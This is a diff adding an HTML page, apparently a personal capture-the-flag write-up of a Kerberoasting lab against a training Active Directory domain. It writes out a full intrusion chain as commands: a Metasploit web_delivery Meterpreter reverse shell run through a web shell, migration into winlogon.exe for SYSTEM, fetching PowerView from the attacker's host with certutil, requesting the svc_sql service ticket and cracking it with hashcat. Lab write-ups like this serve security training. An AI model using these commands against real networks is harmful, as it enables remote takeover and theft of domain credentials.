@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" href="../images/icone.jpg" type="image/png">
+  <title>CTF - KERBEROASTING</title>
+  <link rel="stylesheet" href="../stylr.css" />
+</head>
+<body>
+  <div class="project-container">
+    <h3>During this lab, I already had valid credentials and access to a web shell on the target (WEB01).
+The goal was to identify a Kerberoastable account linked to the following SPN:</h3>
+    <h3>MSSQLSvc/SQL01.inlanefreight.local:1433</h3>
+    </h3>   
+    <style>
+    h3 {
+      font-family: 'Courier New', monospace;
+      color: #00e5c8;
+    }
+  </style>
+    <p>To properly enumerate Active Directory, I first needed a stable reverse shell instead of a basic web shell.</p>
+    <img src="images/kb.png" alt="Firewall" width="500" height="250" />   
+
+    <p><strong>Getting a Reverse Shell </strong><br>
+        I used Metasploit’s web_delivery module to get a Meterpreter session.<br>
+        sudo msfconsole -q<br>
+        search web_delivery<br>
+        use exploit/multi/script/web_delivery<br>
+        <p style="margin-bottom: 1em;"></p>
+        Then I configured the payload:<br>
+        set payload windows/x64/meterpreter/reverse_tcp<br>
+        set LHOST <MY_IP><br>
+        set SRVHOST <MY_IP><br>
+        set TARGET 2<br>
+        exploit<br>
+        Metasploit generated an encoded PowerShell command.<br>
+        I copied it and executed it directly inside the Antak web shell.<br>
+        After that, I got a Meterpreter session back.<br>
+    </p>
+
+    <p><strong>Stabilizing the Session :</strong><br> 
+       First thing I did was check the running processes and migrate to something more stable.<br> 
+        meterpreter > ps<br> 
+        I chose winlogon.exe since it was running as SYSTEM.<br> 
+        meterpreter > getpid<br> 
+        meterpreter > migrate &lt;winlogon_pid&gt; <br> 
+        meterpreter > getuid<br> </p>
+    <p><strong>Résultat :</strong> <br> NT AUTHORITY\SYSTEM <br></p>
+
+    <p><strong>PowerView Setup</strong> 
+        To enumerate domain users and SPNs, I needed PowerView.<br>
+        On my machine:<br>
+        wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1<br>
+        python3 -m http.server 8000 <br> </p>
+
+    <p><strong>On the target:</strong> <br>
+    certutil.exe -f -urlcache -split http://<MY_IP>:8000/PowerView.ps1 PowerView.ps1<br>
+    Then I imported it:<br>
+    Import-Module .\PowerView.ps1 <br></p>
+
+    <p><strong>Finding Kerberoastable Accounts</strong> <br>
+    I listed all domain users that had an SPN:<br>
+    Get-DomainUser * -SPN | select samaccountname<br>
+    Among the results, the interesting one was:<br>
+    svc_sql<br>
+    Kerberoasting svc_sql<br>
+    Next, I requested the Kerberos service ticket for that account and formatted it for Hashcat:<br>
+    Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat<br>
+    This gave me a TGS hash for:<br>
+    MSSQLSvc/SQL01.inlanefreight.local:1433<br>
+    </p>
+
+    <p><strong>Cracking the Hash</strong> <br>
+    I copied the hash into a file and removed all extra spaces:<br>
+    tr -d "[:space:]" < raw_hash.txt > tgs_file<br>
+    Then I cracked it using Hashcat (Kerberos etype 23):<br>
+    hashcat -m 13100 tgs_file /usr/share/wordlists/rockyou.txt<br>
+    </p>
+
+    <p><strong>Boom! Password found</strong> :]</p>
+
+    <a href="../index.html" class="back" style="color:#00e5c8; text-shadow:0 0 5px #00e5c8; transition:0.3s;">← Back Home</a>   
+  </div>
+</body>
+</html> 
